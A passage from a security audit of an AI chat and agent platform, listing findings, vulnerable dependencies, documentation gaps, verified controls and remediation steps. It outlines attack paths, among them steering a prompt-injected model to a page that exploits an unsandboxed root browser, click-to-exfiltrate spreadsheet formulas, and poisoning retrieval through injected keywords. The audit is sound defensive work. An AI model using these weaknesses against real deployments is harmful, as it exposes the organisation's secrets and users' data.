| R-62 [DEPLOY-7, CRYPTO-8] | The in-memory data store, fake OAuth and provider stand-ins are selectable in production by environment alone | `packages/db/src/store/selection.ts:11-13`; `fake-oauth.ts:49-51`; `apps/worker-delegate/src/providers.ts:38` | A copied e2e environment turns a production container into a non-persistent app with forgeable grants, with only a `warn` line | Refuse the memory store under `NODE_ENV=production` without an explicit second variable |
| R-63 [DEPLOY-8] | No memory, pid or tmpfs size limits for non-sandbox services; no log rotation; unthrottled warn rows from bad log-ship keys | `docker-compose.yaml:64-72, 606-611`; `app/api/logs/route.ts:16-21` | Host memory exhaustion from a read-only container; log table growth at line rate from an outsider | Add `mem_limit`, `pids_limit`, sized tmpfs, a logging anchor, and `checkInboundLimit` on `/api/logs*` |
| R-64 [DEPLOY-9] | Build-time supply-chain gaps in the sandbox image | `Dockerfile:1, 578-591, 646-651, 688, 771`; `.dockerignore:19-21` | Mutable BuildKit frontend tag, unpinned CRAN package, pip without `--require-hashes`, `.env*` excluded at the root only | Pin the frontend by digest; pin or vendor `languageserver`; `--require-hashes`; `**/.env*` in `.dockerignore` |
| R-65 [DEPLOY-10] | The `migrate` image runs as root and receives the whole `.env` | `Dockerfile:825-849`; `docker-compose.yaml:115-132` | Needs only `DATABASE_URL` | Add `USER worker` and an explicit environment |
| R-66 [DEPLOY-12] | Backup and recovery guidance does not cover the system as built | DEPLOYMENT.md:979-988, 1209-1301 | A host-Postgres `pg_dump` for a user that does not exist; nothing on the blob store, the sandbox volumes, key custody or restore order | Compose-era runbook: `pg_dump` through compose, blob snapshots, `.env` in a secrets manager, tested restore order |
| R-67 [DEPLOY-13] | Stale deployment options are copy-paste footguns | DEPLOYMENT.md:682-835 | "Vercel (Recommended)" cannot run the stack; the sample compose publishes Postgres 5432 to all interfaces and omits required keys; Node 20 vs the required 24 | Delete Options 1 to 3; point at `docker-compose.yaml` as the only supported shape |
| R-68 [DATA-3] | Chat-side outbound redaction fails open while claiming to mirror the MCP gate | `lib/chat/outbound-redaction.ts:54-63` vs `redaction-gate.ts:119-143` | Uploaded text and memories go to the model unmasked on an internal fault | Withhold on failure or mark the turn; fix the comment |
| R-69 [DATA-4] | Workbook renderer keeps `HYPERLINK` live in LLM-written formulas | `document-render/src/xlsx.ts:84-94` | Click-to-exfiltrate links assembled from neighbouring cells | Add `HYPERLINK` to the deny-list or move to an allow-list |
| R-70 [DATA-5] | Document text extraction has size and character caps but no wall-clock cap, in the web request thread | `document-text/src/pdf.ts:125-166`; `lib/chat/attachments.ts:213-217` | A pathological PDF within the attachment limit stalls the event loop | Deadline plus `task.destroy()`; a worker thread or the existing OCR queue |
| R-71 [DATA-6] | Keyword enrichment sends document text to the model and indexes the reply in plaintext at weight B | `packages/knowledge/src/keywords.ts:70-80, 189-195`; `knowledge-chunks/postgres.ts:227` | Ranking poisoning by injected keywords (off by default) | Reject keywords that do not occur in the text |
| R-72 [DATA-9] | `sql.raw(token.operator)` relies on an external parser's vocabulary with no runtime allow-list | `knowledge-chunks/metadata-filter.ts:73` | The one place request-derived structure reaches raw SQL; safe today if the parser emits only the six operators (parser not in the checkout) | Map through an explicit six-entry record |
| R-73 [XSS-3] | Office previews use `allow-same-origin` srcdoc frames without a frame-level CSP | `chat/_components/artifact-inline.tsx:314-372` | Scripts are blocked; external sub-resource beacons from a crafted document are not (renderer behaviour unverified) | Add a `<meta http-equiv="Content-Security-Policy">` to `FRAME_DOC` |
| R-74 [SBX-4] | `scrubSecretValues` masks three literal spellings and skips short values | `packages/connector-sandbox/src/secrets.ts:332-350` | A command echoes its own env secrets transformed; self-exposure only | Do not present the scrub as a security control |
| R-75 [SBX-5] | Commands can leave `setsid` daemons that outlive the tool call | `apps/worker-sandbox/src/workspaces.ts:595-634` | Persistence as the project uid with the container's network; holds a live git ticket (R-36) | Kill every process of the caller's uid on completion and drain, or run each command in its own PID namespace |

### 5.4 Informational

| ID | Observation | Citation |
| --- | --- | --- |
| R-76 [AUTH-10] | `route-auth-coverage.test.ts` asserts that a guard symbol is present, not which one; the reviewers hand-verified all 75 admin routes and 30 admin pages reference `checkAccess([ROLE_OPERATOR])`. Add a second assertion for `app/api/admin/**`. | `lib/route-auth-coverage.test.ts:181-195` |
| R-77 [AUTH-11, CHAT-8] | Every signed-in member can list every identity (subject, email, name), including people whose sign-in the role mapping refused; intended for share pickers. Move the identity upsert after the role check. | `chat/people/route.ts:193-195`; `callback/route.ts:451-459` |
| R-78 [AUTH-13] | Dead modules describe the retired cookie-roles scheme (`lib/oidc-roles.ts`, `lib/role-check.ts`); delete so nobody revives them. | `oidc-roles.ts:59-62`; `role-check.ts` |
| R-79 [MCP-11] | Discovery metadata overstates capabilities (fragment response mode, revocation, introspection) and the RFC 8707 `resource` indicator is unhandled; not exploitable because tokens are opaque and looked up locally. | `.well-known/oauth-authorization-server/route.ts:36-42` |
| R-80 [AGENT-9] | The agent import route always answers 400 (sends `steps`, parser requires `instructions`); fails closed. | `agents/import/route.ts:55-65`; `payload.ts:28-37` |
| R-81 [AGENT-12] | Operators read `secure()` log attributes decrypted; key separation therefore protects the database-dump case only, as the module says. | `logs/search/route.ts:109-114`; `log-encryption.ts:9-11` |
| R-82 [CONN-9] | Approver and requester of Jira and Salesforce admin changes are not separated; docs say "owner only". | `jira-admin/changes/[changeId]/apply/route.ts:53-58`; `docs/connectors.md:112` |
| R-83 [CONN-11] | Graph pre-authenticated download and upload URLs are fetched without a host check; the source is Microsoft over an allow-listed channel. | `connector-microsoft/src/content.ts:130`; `upload-session.ts:67` |
| R-84 [CONN-12] | ADManager legacy API carries the person's auth token in the query string, a vendor requirement. | `apps/worker-admanager/src/server.ts:270-280` |
| R-85 [CHAT-9, CHAT-10] | Unauthenticated upload-slot page shows the slot filename and status; attachment filenames are interpolated unescaped into the prompt's `<attachment>` wrapper. | `upload/[slotId]/route.ts:26-88`; `lib/chat/attachments.ts:688-697` |
| R-86 [DATA-8] | The data-store seam test does not match dynamic `import('pg')` or `new Pool(`; it is a lint, not a runtime boundary (every process holds `DATABASE_URL`). | `packages/db/src/store/seam.test.ts:23-33` |
| R-87 [DATA-11] | Queue: no payload size cap at the queue layer; producers cap. Ordering keys are code-assigned. | `queues/postgres.ts:60-85` |
| R-88 [DATA-12] | QuickJS cleaner scripts: no `setMaxStackSize`; regex interruptibility under the 250 ms deadline unverified; operator-authored only. | `email-sanitizer/src/scripts/run.ts:95-98, 171-258` |
| R-89 [DEPLOY-11] | Worker images run TypeScript source through `tsx` at boot and ship the native esbuild binary and every package's source tree. | `Dockerfile:234-257` and each worker stage |
| R-90 [DEPLOY-14] | `scripts/docker-build.sh` cannot build the delegate or ADManager images and `docker-push.sh` prints a wrong environment variable name. | `scripts/docker-build.sh:107-112`; `docker-push.sh:792` |
| R-91 [DEPLOY-16] | CI gate semantics: `dependency-review` is `continue-on-error`; Trivy runs with `ignore-unfixed`; `pnpm audit` does not cover the sandbox image's pip, CRAN, npm-global or Go inputs. | `ci.yml:305-306, 480-489, 264` |
| R-92 [XSS-5] | The widget bundle's one `innerHTML` sink takes server-rendered Markdown from Renkei's own renderer; third parties cannot reach it. Add a frame-level CSP to the templates. | `lib/mcp-widgets/src/ui.ts:225-235`; `outlook/markdown.ts:28-57` |
| R-93 [XSS-7] | PDFs are served inline on the application origin; HTML and SVG never are. Keep `SAFE_INLINE` narrow and test it. | `chat/attachments/[attachmentId]/route.ts:24, 43-46` |
| R-94 [CRYPTO-9, CRYPTO-10] | Key parsing accepts any 32 decoded bytes including all zeros; delegations sealed to other instances are stored unverified (harmless on read). | `secretbox.ts:65-75`; `enrollment.ts:423-430` |

### 5.5 Dependencies and base images

Resolved versions were taken from `pnpm-lock.yaml`, the Dockerfile and the image configurations behind the pinned digests, then checked against the npm registry, OSV, `pnpm audit` (run against the lockfile; raw output kept with the working notes) and vendor release pages on 2026-10-31. The GitHub Advisory API was not reachable from the review session, so GHSA data came through OSV and web search. Identifiers prefixed `D-` are dependency findings.

#### D-01 Every image runs Node 24.21.0 and lacks the 2026-10-21 Node security release [CVE-1]

- Severity: High
- Evidence: all nine `FROM` lines pin `node:24-alpine@sha256:ebfe2f90…` or `node:24-bookworm-slim@sha256:d6aa754f…` (`docker/Dockerfile:49, 94, 212, 264, 312, 361, 411, 454, 522, 825`); the image configurations behind both digests report `NODE_VERSION=24.21.0` (built 2026-09-17 and 2026-10-06). Node 24.22.1 (2026-10-21) is the security release; 24.22.2 followed on 2026-10-28. The digest line was last changed on 2026-10-20.
- Description: the October 2026 Node release fixes, among others, a Brotli decoder out-of-bounds write (CVE-2026-111497, listed in CISA's Known Exploited Vulnerabilities on 2026-10-27), two TLS hostname-verification bypasses (CVE-2026-105483, CVE-2026-106069), a DNS NUL-truncation issue (CVE-2026-105482) and a keep-alive response smuggling issue (CVE-2026-105481), plus bundled undici and OpenSSL updates. Node's global `fetch` transparently decodes `Content-Encoding: br`, so the Brotli path is reachable from any server the platform fetches: connected MCP servers, LLM and embeddings endpoints, vendor APIs. The Dockerfile's `apk upgrade`/`apt-get upgrade` cannot move Node, which is installed from a tarball, and Trivy does not identify the Node runtime in official Node images, so no gate catches this.
- Impact: code execution in the web or worker containers from a connected third party; weakened TLS verification on every outbound connection.
- Documentation: `docker/Dockerfile:28-31` and DEPLOYMENT.md:188-192 state that build-time distribution upgrades and the image scan cover fixes shipped since the base image was built.
- Recommendation: bump both digests to the current `24-alpine` and `24-bookworm-slim` and rebuild; add a scheduled CI job that compares the pinned digest's `NODE_VERSION` with the Node release index and fails on a missing security release; merge Dependabot docker proposals within the week.
- Confidence: image contents confirmed from the registry's image configurations; Brotli reachability through `fetch` inferred from undici source, not re-verified against the exact copy bundled in 24.21.0.

#### D-02 The sandbox browser runs Chromium with Chromium's own sandbox disabled, as root, on an early 156 build, against caller-chosen pages [CVE-2]

- Severity: High
- Evidence: `apps/worker-sandbox/src/browser.ts:239-257` launches with `chromium.launch({ headless: true, proxy, args: [...] })` and never sets `chromiumSandbox` (re-read by the lead reviewer; no `--no-sandbox` is passed explicitly, and no uid drop exists in `browser.ts` or `charts.ts`). Playwright's default for `chromiumSandbox` is `false`, and playwright-core 1.64.1 appends `--no-sandbox` whenever it is not `true` (`lib/coreBundle.js:44767-44768`, read from the package tarball). The worker process stays root (`docker/sandbox-entrypoint.sh:26-28`), so the browser and its renderers run as root. `browser.ts:815` navigates to the URL the tool caller supplies. The bundled headless shell is Chromium 156.0.8078.4 (`browsers.json`); Chrome stable 156.0.8078.73 shipped on 2026-10-27 with 52 security fixes, four rated Critical.
- Description: the only boundary around a visited page is the renderer's memory safety. The browse and crawl tools exist to visit arbitrary pages, and a prompt-injected model can be steered to one. Every renderer bug disclosed in a Chrome stable update is a zero-day against this deployment until Playwright ships a new build and the image is rebuilt.
- Impact: a renderer exploit yields root inside the sandbox container, which holds the worker's bearer key, every caller's staged files and workspaces, and, per R-03, every secret in the deployment. This is the sandbox-escape class the review was asked to look for.
- Recommendation: launch the browser as an unprivileged uid using the existing `setpriv` machinery and set `chromiumSandbox: true` (Chromium's layer-one sandbox needs unprivileged user namespaces, which the Scripts feature already documents how to enable, or the setuid `chrome-sandbox` helper); rebuild the sandbox image when Playwright publishes a new Chromium build, or use a stable Chrome for Testing channel; keep the browser's network namespace separate from the worker's listener. Rationale: dropping root and enabling the Chromium sandbox turns a renderer bug from "container root" into "an unprivileged process in a seccomp jail" at no feature cost.
- Confidence: confirmed by reading the launch code, Playwright's bundled source and the entrypoint; the exact CVE delta between the two Chromium builds was not enumerated. Note: the sandbox track's working notes recorded the browser as launched "without `--no-sandbox`" because the literal flag is absent from the code; the library adds it, so that note is superseded.

#### D-03 exceljs 4.4.0 is unmaintained with four unfixed 2026 CVEs; unbounded decompression is reachable from any uploaded workbook [CVE-3]

- Severity: Medium
- Evidence: `apps/web/lib/chat/sheet-preview.ts:60-61` calls `workbook.xlsx.read(...)` on uploaded bytes; exceljs inflates the whole archive through `JSZip.loadAsync` with no per-entry, total or ratio cap (`lib/xlsx/xlsx.js:279`); the preview route reaches it after the session and access checks with no size check beyond the upload limit (default 20 MiB, `packages/settings/src/index.ts:392`). CVE-2026-78206 (unbounded decompression), -78207 (prototype pollution via notes), -78208 (`addImage` traversal) and -78209 (CSV formula) are CVE.org records with git ranges only, so `pnpm audit`, OSV and Trivy all report the package clean; the last npm release is 2024-12-20.
- Reachability: 78206 is reachable by any authenticated uploader (web-process memory exhaustion); 78207 and 78208 are not (no note or `addImage` usage); 78209 depends on whether the CSV writer is used, which was not checked. `unzipper 0.10.14` is pulled in by exceljs but sits on the streaming reader the application does not use.
- Recommendation: read the central directory with jszip before `xlsx.read` and refuse workbooks whose summed uncompressed sizes exceed a budget, or parse previews in a bounded child process; plan a replacement reader; keep a dated review list in `pnpm-workspace.yaml` for unmaintained parsers on untrusted-input paths, since no automated gate will flag them.
- Confidence: read path confirmed in application and library source.

#### D-04 The SMB client is a 2023 fork of an abandoned library that negotiates SMB 2.0.2/2.1 only, with no signing or encryption [CVE-4, CONN-5]

- Severity: Medium
- Evidence: `@tryjsky/v9u-smb2@1.1.0` (last published 2023-06-30, locally patched in `patches/`); its negotiate request offers dialects `0x0202` and `0x0210` only (`lib/structures/negotiate.js:10`); the signature field is zeroed and nothing computes one; authentication is NTLM. Used by `packages/connector-fileshares/src/smb.ts:150-152`, which also resolves paths lexically rather than through the server (`smb.ts:208-214` vs `sftp.ts:134-158`).
- Impact: in-transit tampering of ingested documents (poisoning what the model later reads), NTLM relay on the worker's network segment, and an unreviewed parser of server responses in a worker that holds share credentials. A server that accepts this client has signing disabled.
- Recommendation: prefer SFTP for sensitive shares and say so in the admin form; replace the library with one that negotiates SMB 3.x with signing and encryption, or shell out to a maintained client in a bounded process; until then document that the SMB backend is unsigned.
- Confidence: capabilities confirmed from the library source.

#### D-05 to D-08 (Low)

| ID | Finding | Evidence | Recommendation |
| --- | --- | --- | --- |
| D-05 [CVE-5] | The sandbox Python environment pins pypdf 6.21.2; seven High denial-of-service advisories were published on 2026-10-30, fixed in 6.21.4. Runs are bounded by `ulimit` and a timeout (`apps/worker-sandbox/src/scripts.ts:225-229, 447`). The Trivy gate will now block image pushes until the pin moves. | `docker/Dockerfile:573` | Bump `PYPDF_VERSION`; the Dockerfile comment "kept at their newest" (`:563-565`) is stale |
| D-06 [CVE-6] | Sandbox toolchain one cycle behind: Temurin 21.0.12.1 vs 21.0.13, Rust 1.99.0 vs 1.99.1, typescript-language-server 6.0.0 vs 6.0.2; these run language servers over workspace code as the caller's uid. | `docker/Dockerfile:610-612, 625` | Bump with the next refresh; include `ARG` pins in the scheduled check |
| D-07 [CVE-7] | minimatch below 11.0.1 (CVE-2026-118764, moderate) under exceljs's archiver and under `@campfhir/safe-functions`; the only production `pnpm audit` hits. No attacker controls the patterns. | `pnpm-audit-prod.json` | Clears with the exceljs replacement |
| D-08 [CVE-8] | Process gaps: no scheduled rebuild or scan (`ci.yml:3-6`), so the "daily" distribution refresh holds only on merge days; Trivy runs with `ignore-unfixed`; `dependency-review` is `continue-on-error`; compose pulls `:latest` with no documented `docker compose pull`; Dependabot proposals from 2026-10-26 were still open; mcp-handler parses JSON bodies with no size cap after authentication (`dist/index.js:225`), an authenticated memory DoS by a token holder. | `ci.yml:264, 305-308, 481-489`; `docker-compose.yaml:116-571` | Weekly scheduled job (rebuild, rescan, Node check, audit); document pulls and the SHA tags; a `Content-Length` ceiling in front of the MCP route |

#### D-09 Verified current or clean (Info)

Next.js 16.4.2 (all October 2026 fixes; no `next/image` or `'use cache'` usage), React 19.3.1, `@modelcontextprotocol/server` 2.3.1 (past every 2026 advisory), pdfjs-dist 6.4.299, sharp 0.35.5, dompurify 3.4.17 (the fixed version for the 2026-10-22 advisories, forced by override under monaco and mermaid), all three `marked` copies (18.1.1 server-side; 16.4.2 and 14.0.0 confined to the offline chart page and the browser behind dompurify), mermaid 12.2.0 with `securityLevel: 'strict'`, jose, kysely, pg, zod, ssh2 (host keys pinned), quickjs-emscripten (memory limit and deadline inside WASM), esbuild (import-refusing plugin), the pgvector image (current `pg16` digest, PostgreSQL 16.15). Every override in `pnpm-workspace.yaml` lands on a version OSV reports clean and matches its comment; the single `.trivyignore` entry is accurate and dated; `auditConfig.ignoreGhsas` is empty; `minimumReleaseAge` is set.

## 6. Documentation discrepancies

The reviewers recorded about ninety places where a document, a compose comment or a code comment claims something the code does not do. The security-relevant ones are consolidated here; the rest are in the per-track notes.

| Claim | Where | Reality | Relates to |
| --- | --- | --- | --- |
| `TRUSTED_PROXY_IPS` limits which proxies' forwarded headers are trusted, "default localhost only" | `apps/web/.env.example:44-47`; RENKEI.md Decision 19 | No reader exists; forwarded headers and then `Host` are trusted whenever `PUBLIC_BASE_URL` is unset (`get-origin.ts:37-64`) | R-07 |
| Keep the app port "published on 127.0.0.1 / an internal network" | `docker-compose.yaml:597-602` | The same file publishes `'80:3000'` on all interfaces (`:603-604`) | R-07 |
| Port 80 is "fine on a private/internal network" | `docker-compose.yaml:18-22` | Session cookies are `Secure` in every image; sign-in over plain HTTP cannot complete except from localhost | R-07 |
| Checklist "[x] HTTPS enabled", "[x] PostgreSQL firewall rules" | DEPLOYMENT.md:1080-1085 | Default compose is plaintext on 80; the document's own sample compose publishes 5432 to all interfaces | R-07, R-67 |
| Each caller holds "ITS OWN" delegate key; a leak "names which one"; `USER_KEY_ENCRYPTION_KEY` is "set on the DELEGATE service only"; connector-worker keys "which the app no longer holds"; a dedicated `SANDBOX_ENV_SECRETS_KEY` "so the web app never holds one that opens them" | `docker-compose.yaml:41-51`; DEPLOYMENT.md:36, 43-57, 309-311, 473-474 | `env_file: .env` gives every container every key | R-03 |
| Postgres and the other workers are not reachable from the sandbox | `docker-compose.yaml:441-445, 628-635`; DEPLOYMENT.md:459-464 | The sandbox worker is a Postgres client; as composed it cannot work; the fix flattens the network | R-06 |
| The egress proxy "refuses private and internal addresses", "incl. the cloud metadata IP" | `egress-guard.ts:38`; `docs/sandbox-connector-design.md` | Hex-form mapped IPv6 literals pass; URL parsing produces exactly that form | R-02 |
| Distribution upgrades at build time and the image scan cover fixes shipped since the base was built, "anything else the image carries" | `docker/Dockerfile:28-33`; DEPLOYMENT.md:188-192 | Node is not a distribution package; Trivy cannot see it; builds only run on push | D-01, D-08 |
| Chaining is "authorized on the TARGET" | `apps/worker-agents/src/finalize.ts:5-7`; `docs/agents.md:76` | True, and that is the gap: the source owner never consents | R-01 |
| Run content is visible "to the owner always and to an org admin only on a FAILED run"; knowledge notes are "owner-curated" | `docs/agents.md:95, 69` | A grantee sees everything and can create and purge notes | R-05 |
| "Every egress path passes through a disclosure gate … patient data may be barred from the very LLM calls"; "the enforcement point … before it reaches an external LLM call, a drafted email, or any other egress surface" | RENKEI.md:133, 156, 252; `docs/knowledge-and-security.md:32, 38` | `evaluateDisclosure` is a label lookup inside the MCP regex redactor; no classification labels, no blocking, no email or model-call gating | R-23 |
| Redaction is "applied at the MCP response boundary"; "No tool in this repo emits [a non-text block] today" | `docs/knowledge-and-security.md:38`; `redaction-gate.ts:55-64` | `structuredContent` is never touched and many tools emit it | R-10 |
| `safe-fetch` stops "a tenant-supplied URL pointing the server at" internal hosts | `docs/onbase-connector-design.md:30-31`; `safe-fetch.ts:9-16` | Only OIDC, remote MCP and the sandbox use it; LLM, embeddings, OCR, web-search and voice endpoints use plain `fetch` | R-14 |
| Per-client AND per-endpoint rate limits "so a spoofed address cannot widen the budget" | DEPLOYMENT.md:1087; `inbound-rate-limit.ts:128-134` | Ten thousand unique spoofed keys clear the global window too | R-08 |
| PHI trail: UPDATE and DELETE refused "whatever role connects"; disabling the trigger is a superuser act | DEPLOYMENT.md:1111-1116 | The runtime role owns the table and may disable or drop the trigger | R-13 |
| The app sets `Strict-Transport-Security` when `PUBLIC_BASE_URL` is https | DEPLOYMENT.md:1088 | Decided at `next build`, which CI runs without the variable | R-61 |
| CSP is report-only so reports can be reviewed before enforcing | `security-headers.ts:12-17`; DEPLOYMENT.md:1088 | No `report-to` or `report-uri`; nothing is collected | R-15 |
| Stale roles clear when the MCP caller re-authenticates, like a browser session | `mcp/oauth/authorize/route.ts:283-287` | Refresh never forces re-authentication; frozen roles persist up to 30 days | R-11 |
| Users can end an MCP client's access "from the Access page" | `app/oauth/consent/page.tsx:131-134` | Only operators can | R-24 |
| Admin revoke: "access … has been revoked" | `admin/grants/[grantId]/revoke/route.ts:62` | Local deletion only for most providers | R-39 |
| `rewrap` walks "every value the deployment keys seal"; a clean run means the old key can be dropped | `rewrap.ts:1-5`; DEPLOYMENT.md:1255-1290 | Two sealed columns are not walked | R-37 |
| A compromised web app learns "the user keys of people who sign in or re-seal" | `docs/delegate-key-design.md:98` | Any script on the origin reads the user key on any page load | R-40 |
| "a file a project holds or a person was shared outlives any one chat"; "attachment blobs are deleted before rows" | `docs/artifacts-design.md:65-67`; `docs/chat.md:20` | The owner's delete cascades all of them and deletes no blobs | R-18 |
| Change requests applied by "the owner … and only the owner" | `docs/connectors.md:112`; `jira-admin/change-requests.ts:7-9` | Any operator, on their own grant | R-82 |
| Per-user share, Mirth and ADManager credentials are "sealed under `TOKEN_ENCRYPTION_KEY` … the web app encrypts" | `docs/fileshares-connector-design.md:49-56`; `docs/mirth-connector-design.md:29-30`; `docs/admanager-connector-design.md:36` | Sealed by the delegate under the person's key | — |
| "the gateway refuses to start if [PUBLIC_BASE_URL and the Atlassian callback] disagree" | `docker-compose.yaml:14-16` | No such check exists | — |
| Vercel is the "Recommended" deployment option; sample Dockerfile, compose and systemd unit; Node 20 | DEPLOYMENT.md:682-835 | None of these can run the nine-process stack; the sample compose is insecure; Node 24 is required | R-67 |
| `/api/health` 503 "gates deployments"; migrations under `lib/migrations`; two worker services off one image | README.md:14, 67-85 | Only if the operator gates on it; `packages/db/src/migrations`; nine images and eleven services | — |
| `docs/knowledge-and-security.md` and RENKEI.md describe `tenant_id` columns, a `/api/mcp/[tenantId]/[transport]` route, no ANN index, and Decision 18's verification-TTL dial | `docs/knowledge-and-security.md:14-15, 48`; RENKEI.md:242, 255 | Single organisation since migration 153; route is `/api/mcp/[transport]`; migration 108 adds HNSW; no TTL dial exists | — |
| `.trivyignore` "is the same list" as `auditConfig.ignoreGhsas`; "Pillow and pypdf are kept at their newest" | `.trivyignore:1-10`; `docker/Dockerfile:563-565` | `ignoreGhsas` is empty by design; pypdf is two patch releases behind with open advisories | D-05 |
| `docs/paycom-webhooks.md` | — | Explicitly reference-only; no code exists. Not a discrepancy, recorded so nobody expects a route | — |

## 7. Controls verified as working

The review is not a list of defects only. The following controls were traced to code and found to do what the documentation says. They are the reason several attack paths stop where they do.

**Authentication and sessions.** Opaque random session ids in an `httpOnly`, `SameSite=Lax`, `Secure`-in-production cookie with subject and roles server-side (`session.ts:61-80`); a new id per sign-in; OIDC `state` single-use, ten minutes, bound to the browser by cookie (`login/route.ts:63-73`; `callback/route.ts:244-270`); `nonce`, `iss`, `aud` with `azp`, and `exp` checked (`oidc-id-token.ts:34-55`); discovery and token fetches through the SSRF-guarded fetch with the client secret only POSTed to a verified public https host (`callback/route.ts:295-353`); role minting by exact claim match with refusal otherwise; centralised `checkAccess` referenced by all 75 admin routes and 30 admin pages; sign-out and "sign out everywhere" delete sessions and MCP tokens transactionally; first-run setup protected by a constant-time digest compare and an `ON CONFLICT ((true))` insert so two racing submitters cannot both win; the test-only sign-in route unreachable without the memory store and a seed token.

**MCP authorisation server and gateway.** PKCE mandatory and S256-only; redirect URIs validated at authorise and matched exactly at token, with the loopback-port exception only and `javascript:`, `data:`, non-loopback `http:` refused (probed by the reviewer); codes bound to client, redirect, challenge and subject with a 60-second life; client authentication before grant handling; refresh rotation with reuse detection under `FOR UPDATE`; consent bound to session and origin and spent atomically; all bearer credentials stored as SHA-256 digests and compared in constant time; class-specific token lookup so agent and widget tokens never resolve as client tokens; run tokens minted only in-process, allow-listed by tool name for agent runs and revoked in `finally`; app-only confirm tools registered only for widget-class tokens; read-only mode, disabled connectors, audiences and roles applied as AND-gates at registration with a database-derived surface version in the cache key; external MCP servers operator-only, https-only, with tokens pinned to the server origin and namespaced tool names that cannot shadow first-party tools.

**Chat and data access.** Every one of the 58 chat routes authenticates through the session and resolves access through the owner, a viewer grant or project membership; nested ids are bound to their parent in SQL; no route reads a subject from the body; read-only shares really are read-only, and only the owner can answer a tool-permission prompt; attachment downloads are `octet-stream` with `attachment` disposition except a short image, PDF and plain-text list, with `nosniff` and `no-store`, and SVG and HTML are never inline; blob keys are built from identifiers only and bytes are stored sealed; upload slots use a 32-byte hashed single-use token with a streamed cap; temporary chats are excluded from recall and memory and swept with their blobs.

**Agents.** The model's run token names read tools only; acts are staged and executed under a separate token; active-time and tool-call limits are enforced before every model and tool call; an approval timeout never approves; `ALWAYS_APPROVAL_TOOLS` override auto-accept; trigger filters are evaluated server-side; every tool result and trigger value is fenced as untrusted; approval cards are owner-scoped with an optimistic claim; curated-card approvals run on the approver's own grant.

**Cryptography and keys.** AES-256-GCM with a random 96-bit IV and a checked tag; versioned keyrings with no plaintext or weaker legacy accepted on read; HKDF-derived key-encryption keys and scrypt for passphrases; X25519 sealed boxes with key-bound info; per-chat data keys wrapped per holder so cross-subject relocation fails; the delegate's per-caller allow-list, session binding and automation-replacement proof; device approval with a constant-time 50-bit code and lockout; development keys and provider stand-ins refused in production; log encryption mandatory at boot wherever `secure()` attributes are written.

**Inbound surface.** All five webhook routes verify correctly and fail closed when unconfigured, with 1 MiB streamed body caps and signature-shape gates before any database read on four of five; no unsigned delivery reaches the queue, and workers re-fetch content under the owner's own token so payload text never reaches the index or an agent; the queue claims under `FOR UPDATE SKIP LOCKED` with bounded retries and a dead-letter table.

**Sandbox.** Child environments are built from nothing, so no database URL, bearer key or sealing key reaches a spawned command; uid drop through `setpriv` with `no-new-privs`, cleared bounding and ambient sets, proven at boot; scripts run `python -I -B` under `RLIMIT_AS`, `NPROC` and `FSIZE` in a network namespace, failing closed unless the organisation opts in; path containment through `realpath` and `O_NOFOLLOW`; git as argv with ref, SHA and clone-URL validation and no token in the child; the egress proxy pins the resolved address and re-checks every redirect, and numeric and octal IPv4 spellings are caught (tested); the compose capability set is the minimal seven with no `SYS_ADMIN`; services run on an internal network without privileges behind an image allow-list.

**Data layer.** Every SQL value is bound and every interpolated identifier comes from a code constant or typed allow-list; LIKE patterns from input are escaped; every knowledge read that returns content passes `verifyCandidates` before decryption, default-deny on a missing, failing or late verifier, with Atlassian, SharePoint and WebEx verifiers calling the provider live under the requesting user's credential; the OOXML reader caps entry count, size and ratio before inflating and the XML scanner processes no DTD; the xlsx renderer refuses external-reference and command formulas; QuickJS runs with a memory limit, a deadline and no host functions; organisation settings are type-checked and clamped.

**Deployment.** GitHub Actions pinned to commit SHAs with read-only default permissions; `pull_request` only, never `pull_request_target`; registry login and push only on `main`; base images digest-pinned; Trivy and `pnpm audit` gates with dated ignores; provenance and SBOM attached; non-root users, read-only root filesystems and `cap_drop: ALL` for every stateless service; Postgres unpublished with a mandatory password; the seam test keeping SQL inside `packages/db`; webhook query strings never logged and credential-shaped parameters redacted.

## 8. Recommended order of work

Each item names the findings it closes. The first group is small, mostly configuration, and removes the paths that turn one problem into total compromise.

1. **Within days.** Bump the Node base digests and pypdf (D-01, D-05). Replace `env_file: .env` with per-service environment lists (R-03). Canonicalise IPv6 in the egress guard (R-02). Add the ownership check on chain triggers and the owner predicate in `listChainTargets` (R-01). Launch the sandbox browser unprivileged with `chromiumSandbox: true` and rebuild on Chromium updates (D-02).
2. **Within weeks.** Make `PUBLIC_BASE_URL` mandatory in production, publish `127.0.0.1:3000:3000`, delete the phantom `TRUSTED_PROXY_IPS` text (R-07). Fix the limiter's global window (R-08). Resolve the sandbox worker's database route honestly (R-06). Walk `structuredContent` in the redaction gate (R-10). Suppress withheld counts for providers without a grant (R-09). Bind grantee-minted API keys to the grant and treat non-owner runs as external (R-05). Require https or the insecure-transport discipline for LLM, embeddings, OCR and search endpoints, and audit their changes (R-14, R-21). Pin and sign first-party images, gate publishing on the full check set, and enable rulesets on `main` (R-19). Add AAD to the secretbox and run a `rewrap` (R-04). Override `img` in the markdown renderer and add a CSP report sink (R-15). Require a live session on MCP refresh (R-11). Operator attestation of remote tools' read-only status (R-12).
3. **Within a quarter.** Split database roles and extend the append-only trigger to `audit_events` (R-13). Fix the artifact cascade (R-18). Per-owner run and connector quotas (R-20). The Low items in section 5.3, starting with the git-ticket repository binding (R-36), the rotation runbook omissions (R-37), the upstream revocation gaps (R-39), and the exceljs decompression cap (D-03). Correct the documents listed in section 6, in particular the disclosure-gate claims (R-23), the deployment guide's stale options and backup section (R-66, R-67), and the delegate design's threat-model row (R-40).
4. **Process.** A weekly scheduled CI job that rebuilds, rescans and checks the pinned Node version; a dated review list of unmaintained parsers on untrusted-input paths; a compose smoke test that exercises the real network topology; a second assertion in the route-coverage test for admin routes.

## 9. Limitations

- Static review only. Nothing was deployed, scanned or exploited. Where behaviour depends on a running kernel, browser or database (the IPv6 dial in R-02, the cookie round-trip in R-17, HSTS in R-61, the exceljs inflation in D-03) the report says so and names the check that would settle it.
- `node_modules` was not installed in the review checkout, so library behaviour was taken from package tarballs the reviewers fetched (playwright-core, mcp-handler, exceljs, the SMB client) or from documentation (react-markdown's URL transform, React's `javascript:` handling, `web-push` endpoint validation, the bored-logs query parser). Existing unit tests were read, not run.
- The GitHub Advisory API was unreachable; advisory data came through OSV, `pnpm audit` and vendor pages. Classic branch protection on `main` could not be read.
